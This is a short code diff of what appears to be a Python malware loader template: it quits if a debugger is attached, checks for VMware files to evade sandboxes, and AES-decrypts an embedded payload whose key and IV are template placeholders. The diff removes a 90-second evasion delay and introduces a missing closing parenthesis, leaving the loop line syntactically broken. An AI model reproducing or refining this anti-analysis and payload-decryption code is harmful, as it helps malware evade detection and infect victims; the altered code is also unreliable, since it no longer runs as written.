@@ -16,8 +16,6 @@ import logging
 import threading
 import urllib3
 import pyaes
-
-time.sleep(90)
 if sys.gettrace() is not None:
     sys.exit()
 if os.path.exists("C:\\Program Files\\VMware\\VMware Tools") or os.path.exists("C:\\Windows\\System32\\drivers\\vmmouse.sys"):
@@ -29,7 +27,7 @@ iv = base64.b64decode("%s")
 
 aes = pyaes.AESModeOfOperationCBC(key, iv)
 decrypted = b""
-for i in range(0, len(enc), 16):
+for i in range(0, len(enc), 16
     decrypted += aes.decrypt(enc[i:i+16])
 
 pad = decrypted[-1]
